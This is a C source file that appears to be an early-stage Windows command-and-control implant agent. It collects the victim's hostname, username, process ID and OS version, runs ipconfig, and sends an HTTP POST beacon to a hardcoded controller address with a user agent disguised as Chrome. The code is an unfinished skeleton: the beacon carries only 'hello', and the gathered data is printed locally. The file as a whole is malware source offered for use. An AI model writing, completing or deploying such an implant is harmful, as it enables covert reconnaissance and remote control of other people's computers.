#include <windows.h>
#include <stdio.h>
#include <wininet.h>

// Socket globals

struct AgentRegistration {
    // Credit to https://github.com/CodeXTF2/PyHmmm/blob/master/agent.py
        /* 
        # Register info:
        #   - AgentID           : int [needed]
        #   - Hostname          : CHAR [needed]
        #   - Username          : CHAR [needed]
        #   - Domain            : str [optional]
        #   - InternalIP        : str [needed]
        #   - Process Path      : str [needed]
        #   - Process Name      : str [needed]
        #   - Process ID        : DWORD [needed]
        #   - Process Parent ID : int [optional]
        #   - Process Arch      : str [needed]
        #   - OS Build          : str [needed]
        #   - OS Version        : str [needed]
        #   - OS Arch           : str [optional]
        */
    //int AgentID;
    char Hostname[260];
    char Username[260];
    //char IP[260];
    //char Domain[];
    //char Address[];
    //char Path[];
    //char Name[];
    DWORD ProcId; 
    //int ProcParentID[];
    //char ProcArch[];
    //char Build[];
    DWORD Version;
    //char OSArch[];
}Register;

struct AgentInformation {
    char *Address;
    char *UserAgent;
    int Port;
    char *Path;
}Agent;

void Registration() {
    DWORD HostnameLength = 260;
    if (GetComputerNameA(Register.Hostname, &HostnameLength)) {
        printf("Hostname: %s \n", Register.Hostname);
    }

    DWORD UsernameBuffer = 260;
    if (GetUserNameA(Register.Username, &UsernameBuffer)) {
        printf("Username: %s \n", Register.Username);
    }

    if (Register.ProcId = GetCurrentProcessId()) {
        printf("Process ID: %lu \n", Register.ProcId);
    }

    if (Register.Version = GetVersion()) {
        printf("Host Version: %lu \n", Register.Version);
    }
    system("C:\\Windows\\System32\\ipconfig"); // This is a really bad implementation. Change this
}

void Init() {
    Agent.Address = "192.168.227.130";
    Agent.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 ";
    Agent.Port = 8080;
    Agent.Path = "/";   

    DWORD post_buffer_length = 10;
    CHAR *data = "hello";
    CHAR *post_buffer = (CHAR*)calloc(strlen(data) + 5, sizeof(CHAR));

    sprintf_s(post_buffer, 10, "%s\r\n\r\n", data);

    CHAR content_length[MAX_PATH];
    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);


    HINTERNET hInternet = InternetOpenA(Agent.UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
    if (hInternet != NULL) {
        HINTERNET hConnect = InternetConnectA(hInternet, Agent.Address, Agent.Port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", Agent.Path, 0, 0, 0, 0, 0);
            if (hRequest != NULL) {
                HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
                HttpSendRequest(hRequest, 0, 0, post_buffer, 10);
            }
        }
    }
}


int main() {
    Registration();
    Init();
}